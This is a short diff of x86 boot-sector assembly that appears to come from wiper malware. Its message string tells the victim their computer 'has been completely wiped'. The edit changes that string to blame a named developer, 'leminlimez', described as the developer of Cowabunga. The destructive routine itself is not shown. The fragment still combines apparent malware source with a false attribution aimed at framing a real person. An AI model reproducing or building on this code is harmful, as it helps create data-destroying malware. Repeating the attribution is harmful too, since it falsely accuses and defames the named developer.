@@ -28,7 +28,7 @@ start:
     ; E
     jmp $
 
-message db "Congratulations! Your computer has been completely wiped. Don't bother seeking help; it's too late!", 0
+message db "Congratulations! Your computer has been completely wiped. Don't bother seeking help; This was done by leminlimez (real), dev of Cowabunga!", 0
 mask db '*.*', 0
 
 times 510-($-$$) db 0
